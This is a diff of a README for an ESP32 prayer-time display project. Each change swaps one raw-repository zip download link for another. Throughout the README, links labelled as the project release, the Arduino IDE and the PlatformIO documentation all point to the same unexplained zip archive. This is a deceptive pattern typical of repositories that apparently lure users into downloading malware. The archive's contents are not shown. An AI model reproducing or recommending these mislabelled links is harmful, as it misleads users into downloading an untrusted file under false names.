@@ -1,6 +1,6 @@
 # 🌙 mawaqit-prayer-display - Display Prayer Times Effortlessly
 
-[![Download Latest Release](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/docs/prayer_display_mawaqit_v1.3.zip%20Latest%20Release-v1.0.0-green)](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/docs/prayer_display_mawaqit_v1.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/data/prayer_display_mawaqit_v1.0.zip%20Latest%20Release-v1.0.0-green)](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/data/prayer_display_mawaqit_v1.0.zip)
 
 ## 🎯 Overview
 
@@ -21,7 +21,7 @@ Follow these steps to download and run the application on your device.
 
 To download the latest version of mawaqit-prayer-display, visit this page to download:
 
-[Download Latest Release](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/docs/prayer_display_mawaqit_v1.3.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/data/prayer_display_mawaqit_v1.0.zip)
 
 ### 3. Installation Instructions
 
@@ -66,8 +66,8 @@ If you run into any issues, here are a few common solutions:
 ### 7. Resources
 
 - **ESP32-S3 Documentation**: For detailed specs and programming instructions.
-- **Arduino IDE**: Download here [Arduino IDE](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/docs/prayer_display_mawaqit_v1.3.zip).
-- **PlatformIO**: Documentation can be found at [PlatformIO Docs](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/docs/prayer_display_mawaqit_v1.3.zip).
+- **Arduino IDE**: Download here [Arduino IDE](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/data/prayer_display_mawaqit_v1.0.zip).
+- **PlatformIO**: Documentation can be found at [PlatformIO Docs](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/data/prayer_display_mawaqit_v1.0.zip).
 
 ### 8. Feedback and Support
 
@@ -77,6 +77,6 @@ If you have suggestions or need assistance, open an issue on GitHub or check the
 
 Visit this page to download the latest version of mawaqit-prayer-display for your device:
 
-[Download Latest Release](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/docs/prayer_display_mawaqit_v1.3.zip)
+[Download Latest Release](https://raw.githubusercontent.com/ibnuahkam/mawaqit-prayer-display/main/data/prayer_display_mawaqit_v1.0.zip)
 
 Engage comfortably with your daily prayers, using the sunshine of technology to enhance your spiritual experience.
